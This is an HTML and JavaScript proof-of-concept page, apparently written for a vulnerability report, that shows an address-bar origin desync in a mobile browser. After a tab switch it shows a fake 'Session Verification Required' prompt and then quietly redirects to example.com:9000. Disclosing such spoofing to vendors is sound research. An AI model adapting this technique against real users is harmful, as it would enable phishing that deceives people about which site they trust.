<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  font-size:17px;
  padding:12px 18px;
  border-radius:12px;
  border:none;
  background:#007aff;
  color:#fff;
}

#panel {
  display:none;
  max-width:420px;
  margin:80px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

.meta {
  font-size:14px;
  color:#666;
  margin-bottom:12px;
}

.origin {
  font-family:monospace;
  background:#eee;
  padding:6px 8px;
  border-radius:8px;
  font-size:13px;
  margin-bottom:14px;
}

.action {
  background:#34c759;
  width:100%;
}
</style>
</head>

<body>

<div style="padding:40px;text-align:center">
  <button id="start">Start PoC</button>
</div>

<div id="panel">
  <h2>Session Verification Required</h2>
  <div class="meta">
    Page content has updated after tab switch.<br>
    Observe address bar vs rendered origin.
  </div>

  <div class="origin">
    document.location.origin:<br>
    <span id="origin"></span>
  </div>

  <button class="action" onclick="userAction()">
    Continue Session
  </button>
</div>

<script>
const panel = document.getElementById('panel');
const originLabel = document.getElementById('origin');
const startBtn = document.getElementById('start');

function userAction() {
  alert('User action executed while origin indicator was stale');
}

startBtn.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
  originLabel.textContent = location.origin;
};

/*
 Triggered when user leaves tab (tab overview)
 and returns — mimics real Firefox iOS lifecycle
*/
document.addEventListener('visibilitychange', () => {
  if (!document.hidden) {
    // show stale origin briefly
    originLabel.textContent = location.origin;

    // delay navigation slightly to allow UI desync
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'http://example.com:9000';
      }, 120);
    });
  }
});
</script>

</body>
</html>
